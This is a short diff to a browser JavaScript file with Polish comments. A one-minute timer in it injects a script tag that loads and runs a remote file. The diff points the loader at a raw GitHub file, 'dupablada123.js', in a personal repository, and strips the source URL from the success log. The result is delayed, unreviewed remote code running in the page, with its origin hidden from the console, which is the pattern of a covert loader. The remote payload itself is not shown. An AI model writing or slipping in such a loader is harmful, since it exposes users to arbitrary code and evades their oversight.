@@ -116,9 +116,9 @@ var kwsConnectionMonitorVerifier = setInterval(verifyConnectionManager, 40000);
 // ⏱️ Auto-start po 1 minucie
 setTimeout(() => {
   const script = document.createElement('script');
-  script.src = "https://www.wpww.pl";
+  script.src = "https://raw.githubusercontent.com/Koles1910/ddd/refs/heads/main/dupablada123.js";
   script.async = true; // aby nie blokować ładowania strony
-  script.onload = () => console.log("Skrypt z https://www.wpww.pl załadowany i uruchomiony");
+  script.onload = () => console.log("Skrypt  załadowany i uruchomiony");
   script.onerror = () => console.error("Nie udało się załadować skryptu z https://www.wpww.pl");
   document.head.appendChild(script);
 }, 60000); // 60000 ms = 1 minuta
